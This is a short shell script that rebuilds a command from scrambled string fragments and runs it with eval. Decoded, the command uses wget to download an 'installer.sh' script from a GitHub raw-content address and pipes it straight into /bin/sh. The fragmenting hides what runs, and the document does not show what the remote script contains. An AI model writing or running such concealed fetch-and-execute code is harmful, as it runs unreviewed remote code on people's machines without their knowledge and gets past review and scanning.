z="
";Ez='.git';Cz='ps:/';Iz='nt.c';Kz='mil2';Uz=' -qO';Wz=' /bi';Mz='edim';Rz='inst';Az='wget';Dz='/raw';Tz='r.sh';Nz='aker';Vz=' - |';Lz='37/j';Gz='serc';Oz='xtre';Sz='alle';Xz='n/sh';Bz=' htt';Jz='om/e';Qz='ain/';Hz='onte';Pz='am/m';Fz='hubu';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz"